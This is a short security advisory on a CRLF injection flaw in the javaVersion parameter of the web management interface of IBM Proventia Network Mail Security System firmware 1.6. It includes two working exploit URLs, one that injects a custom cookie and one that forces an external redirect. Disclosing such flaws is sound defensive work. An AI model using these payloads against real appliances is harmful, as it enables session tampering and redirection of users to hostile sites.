Description

Web-based Local Management Interface (LMI) of IBM Proventia Network Mail Security System appliance (firmware 1.6) is vulnerable to a CRLF Injection vulnerability. When exploited by an authenticated attacker, such vulnerability could lead to compromising the security of the appliance, allowing injection of custom HTTP cookies, forcing external redirects, potential HTTP Response Splitting attacks, etc.

The affected resource is not part of the IBM PNMSS firmware 2.5.

By manipulating the javaVersion parameter of load.php resource, an authenticated attacker can perform the attacks above.

The following exploit allows injecting custom cookies used by the client browser during a valid HTTP session:

	url_placeholder/load.php?browVerOK=true&browVerPerfect=false&javaVersion=any%0D%0ASet-cookie:	%20MyOwnCookie=SOME_DATA_HERE&javaVendor=Sun%20Microsystems	%20Inc.&javaEnabled=true&welcome=true&detectionFlag=1&popupBlocked=no

The following exploit allows forcing external browser redirects:

	url_placeholder/load.php?browVerOK=true&browVerPerfect=false&javaVersion=any%0D%0ALocation:	%20http://www.google.com%0D%0A&javaVendor=Sun%20Microsystems	%20Inc.&javaEnabled=true&welcome=true&detectionFlag=1&popupBlocked=no


Affected Versions

IBM Proventia Network Mail Security System - virtual appliance (firmware 1.6)
